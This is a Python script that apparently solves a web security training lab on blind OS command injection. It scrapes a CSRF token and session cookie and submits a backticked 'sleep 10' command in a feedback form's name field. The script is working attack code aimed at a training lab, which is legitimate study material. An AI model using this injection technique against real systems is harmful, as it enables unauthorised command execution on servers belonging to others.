###############################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 10/10/2023
#
# Lab: Blind OS command injection with time delays
#
# Steps: 1. Fetch the feedback page
#        2. Extract csrf token and session cookie
#        3. Inject payload into the name field when submitting a feedback
#           to cause a 10 second delay
#        4. Wait for the response
#
###############################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0afd001e035b745c8238ab030040007a.web-security-academy.net" 

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "name")

try:
    # fetch the feedback page
    injection = requests.get(f"{url}/feedback")
    
except:
    print(Fore.RED + "[!] Failed to fetch the feedback page through exception")
    exit(1)

print(Fore.WHITE + "⦗1⦘ Fetching the feedback page.. " + Fore.GREEN + "OK")

# get session cookie
session = injection.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", injection.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")

# the payload to cause a 10 second delay
payload = "`sleep 10`"

# set session cookie
cookies ={
    "session": session
}

# data to send via POST
data = {
    "csrf": csrf,
    "name": payload,
    "email": "no@hack.com",
    "subject": "hacking",
    "message": "you are hacked",
}

print(Fore.WHITE + "⦗3⦘ Injecting payload to cause a 10 second delay (wait).. ", end="\r", flush=True)

try:
    # fetch the page with the injected payload
    injection = requests.post(f"{url}/feedback/submit", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)


# if response is OK
if injection.status_code == 200:
    print(Fore.WHITE + "⦗3⦘ Injecting payload to cause a 10 second delay (wait).. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")

else:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload")

